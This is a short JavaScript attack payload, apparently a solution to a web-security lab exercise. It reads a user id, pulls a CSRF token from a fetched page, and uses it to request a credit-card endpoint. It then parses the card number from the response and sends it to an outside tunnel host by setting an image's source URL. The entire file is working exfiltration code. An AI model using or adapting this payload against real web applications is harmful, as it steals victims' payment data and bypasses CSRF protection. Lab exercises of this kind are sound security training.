var settings = document.getElementById("settings");
var uid = settings.text.split(":")[1];
var url = settings.href;

var xhr = new XMLHttpRequest();
var xhr2 =new XMLHttpRequest();
xhr.open("GET", url, true);
// Callback when request is done

function exfiltrate_creditcard(){
    var el = document.createElement("html");
    // Leak credit card
    el.innerHTML = xhr2.responseText;
    var leak = el.getElementsByTagName("div")[4].textContent;
    // Results -> credit card
    document.getElementById("result").textContent = leak;
    // Post to server
    img = document.createElement("img");
    img.src = "https://puny-maps-swim.loca.lt?credit=" + leak;


}

xhr.onload = () => {
    // Setup form
    var el = document.createElement("html");
    el.innerHTML = xhr.responseText;
    var csrf = el.getElementsByTagName("input")[1].value;

    var dat = new URLSearchParams({
        "uid":uid,
        "csrf_token":csrf
    })
    xhr2.open("GET", "/lab/webapp/jfp/19/getcreditcard?" + dat.toString(), true);
    xhr2.onload = exfiltrate_creditcard;
    xhr2.send();

};
xhr.send();